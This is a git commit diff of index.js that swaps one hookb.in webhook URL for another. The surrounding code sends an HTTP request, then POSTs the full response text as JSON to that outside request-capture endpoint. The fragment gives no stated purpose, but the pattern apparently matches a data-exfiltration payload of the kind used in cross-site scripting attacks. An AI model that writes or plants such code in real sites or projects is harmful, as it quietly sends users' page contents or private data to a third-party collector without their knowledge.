e2cb880822749b1c457fe6549e95e058aa705b78
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-05 12:41:38 -0800

    Update index.js

--- index.js
+++ index.js
@@ -5,7 +5,7 @@ http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 http.onload = function () {
     //if (http.readyState === http.DONE) {
         const xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://hookb.in/NOrVbE6jO3Fe8mNNl6ED', true);
+        xhr.open('POST', 'https://hookb.in/YV0RexmZ9NsQERGGd0gN', true);
         xhr.setRequestHeader('Content-type', 'application/json');
         xhr.send(JSON.stringify(http.responseText));
         
